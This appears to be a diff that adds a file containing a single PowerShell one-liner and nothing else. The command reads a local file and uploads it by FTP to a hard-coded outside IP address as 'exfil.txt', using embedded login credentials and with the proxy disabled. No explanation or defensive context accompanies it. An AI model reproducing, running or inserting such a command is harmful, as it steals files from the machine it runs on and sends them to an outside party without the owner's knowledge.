@@ -1,0 +1,7 @@
+$ftp="ftp://18.181.206.85/uploads/exfil.txt"; $um = "cset"; $pw = "Suomeksi"; $localFile="\\Kissa\odt\s\s.txt"; $ftpRequest=[System.Net.FtpWebRequest]::Create($ftp); [System.Net.WebRequest]::DefaultWebProxy = $null; $ftpRequest.Credentials=(New-Object System.Net.NetworkCredential($um, $pw)); $ftpRequest.Method=[System.Net.WebRequestMethods+Ftp]::UploadFile; $ftpRequest.UsePassive=$true; $ftpRequest.UseBinary=$true; $fileContent=[System.IO.File]::ReadAllBytes($localFile); $ftpStream=$ftpRequest.GetRequestStream(); $ftpStream.Write($fileContent, 0, $fileContent.Length); $ftpStream.Close()
+
+
+
+
+
+
